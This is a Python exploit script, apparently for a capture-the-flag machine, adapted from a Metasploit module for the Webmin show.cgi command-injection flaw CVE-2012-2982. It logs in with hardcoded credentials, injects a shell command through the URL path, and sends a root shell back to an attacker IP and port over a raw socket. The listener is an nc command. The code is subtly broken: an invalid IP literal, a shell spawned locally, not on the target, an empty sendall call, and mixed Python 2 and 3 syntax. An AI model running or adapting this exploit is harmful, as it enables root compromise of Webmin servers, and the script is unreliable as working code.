#!/usr/bin/env python

#Converted from ruby metasploit module (/webmin_show_cgi_exec.rb) (github link)

#CVE-2012-2982 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2982)

#program outline:
	# - POST request with compromised creds to get the cookie
	# - exploit using invalid characters to get system shell
	# - fetches system shell as root
	# - sends shell through socket to listening attacker IP

#usage: 
	# - MUST BE SSH TUNNELED INTO MACHINE TO ACCESS localhost
	# - python gamezone.py 
	# - listen with nc -nlvp 4445 on attacker

import sys, os, subprocess, requests, socket, string, secrets

lhost = 10.0.0.0 #attacker IP CHANGE
lport = 4445 

#Login with compromised creds and print good status response
data = {'page' : "%2F", 'user' : "agent47", 'pass' : "videogamer124"} #must be A dictionary, list of tuples, bytes or a file object
url = "http://localhost:10000/session_login.cgi"

r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False) #send POST request to login 
#if status code 302 found and sid not empty 
if r.status_code == 302 and r.cookies["sid"] != None:
	print("[+] Login successful, executing payload (listen for shell)")
else:
	print("[-] Failed to login")

sid = r.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip() #replace the sid cookie newline character, split at = and store the second element (sid) of array, split at ; and stop at first element in array, strip remaining
print('\n')


#generates random characters and delivers the payload
def rand():
	alphaNum = string.ascii_letters + string.digits #custom alphanumeric string variable
	randChar = ''.join(secrets.choice(alphaNum) for i in range(5)) #generate 5 random alphanumeric characters
	return randChar
#explain change from .popen to .run, .run() to let the command finish to retrieve complete output?
def payload():
	exploit = subprocess.run(['/bin/sh', '-i'], capture_output=True)
	con1 = exploit.stdout #captures the stdout of the subprocess (bytes)
	con2 = con1.decode("utf-8") #decodes the bytes into a string
	return con2

exp = "http://localhost:10000/file/show.cgi/bin/" + "%s|%s|" % (rand(), payload())

req = requests.post(exp, cookies={"sid":sid}, verify=False, allow_redirects=False) #send POST request to login 
#if status code 200 found and response message equals string
if req.status_code == 200 and req.reason == "/Document follows/":
	print("[+] Payload successful, sending shell")
else:
	print("[-] Failed to execute payload")


#Opens network socket to send shell to attacker IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((lhost, lport))  
# output of req or just req?
s.sendall() #make argument return result of exploit function
data = s.recv(1024) #socket atempts to receive data. receive the server reply and print it. number is arbitrary buffer size 
s.close()
print 'Received', repr(data)